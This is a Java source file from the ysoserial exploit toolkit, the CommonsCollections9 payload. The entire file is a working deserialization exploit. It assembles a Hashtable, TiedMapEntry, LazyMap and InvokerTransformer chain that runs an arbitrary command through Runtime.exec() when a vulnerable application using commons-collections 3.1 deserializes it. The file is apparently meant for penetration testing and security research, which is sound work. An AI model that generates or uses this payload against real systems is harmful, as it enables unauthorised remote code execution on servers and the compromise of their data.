package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/*
 Gadget chain:
    java.util.Hashtable.readObject
        java.util.Hashtable.reconstitutionPut
        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                org.apache.commons.collections.map.LazyMap.get()
                    org.apache.commons.collections.functors.ChainedTransformer.transform()
                    org.apache.commons.collections.functors.InvokerTransformer.transform()
                    java.lang.reflect.Method.invoke()
                        java.lang.Runtime.exec()

 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({ Authors.WH1T3P1G })
public class CommonsCollections9 extends PayloadRunner implements ObjectPayload<Hashtable>{
    @Override
    public Hashtable getObject(String command) throws Exception {
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                execArgs),
            new ConstantTransformer(1)};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        Hashtable hashtable = new Hashtable();
        hashtable.put("foo",1);
        // 获取hashtable的table类属性
        Field tableField = Hashtable.class.getDeclaredField("table");
        Reflections.setAccessible(tableField);
        Object[] table = (Object[])tableField.get(hashtable);
        Object entry1 = table[0];
        if(entry1==null)
            entry1 = table[1];
        // 获取Hashtable.Entry的key属性
        Field keyField = entry1.getClass().getDeclaredField("key");
        Reflections.setAccessible(keyField);
        // 将key属性给替换成构造好的TiedMapEntry实例
        keyField.set(entry1, entry);
        // 填充真正的命令执行代码
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
        return hashtable;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections9.class, args);
    }
}
